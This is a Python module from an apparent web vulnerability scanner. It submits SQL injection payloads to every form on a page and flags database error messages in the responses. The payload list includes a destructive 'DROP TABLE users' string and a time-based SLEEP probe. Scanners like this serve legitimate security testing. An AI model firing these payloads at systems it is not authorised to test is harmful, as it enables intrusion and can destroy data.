from .crawler import get_forms, submit_form
import requests

SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    '" OR "1"="1',
    "1; DROP TABLE users --",
    "' AND SLEEP(2) --",    # Time-based (blind) hint
]

# Signatures from common databases
DB_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "pg_query()",
    "sqlite3.operationalerror",
    "microsoft ole db provider for sql server",
    "ora-01756",
]

def scan_sqli(url: str, session: requests.Session) -> list[dict]:
    """Test all forms on a URL for SQL injection vulnerabilities."""
    findings = []
    forms = get_forms(url, session)

    for form in forms:
        for payload in SQLI_PAYLOADS:
            response = submit_form(form, payload, session)
            if response is None:
                continue

            body_lower = response.text.lower()
            for sig in DB_ERROR_SIGNATURES:
                if sig in body_lower:
                    finding = {
                        "type": "SQLi",
                        "url": url,
                        "form_action": form["action"],
                        "method": form["method"],
                        "payload": payload,
                        "db_error": sig,
                    }
                    findings.append(finding)
                    print(f"  [!] SQLi FOUND at {form['action']} — error: '{sig}'")
                    break

    return findings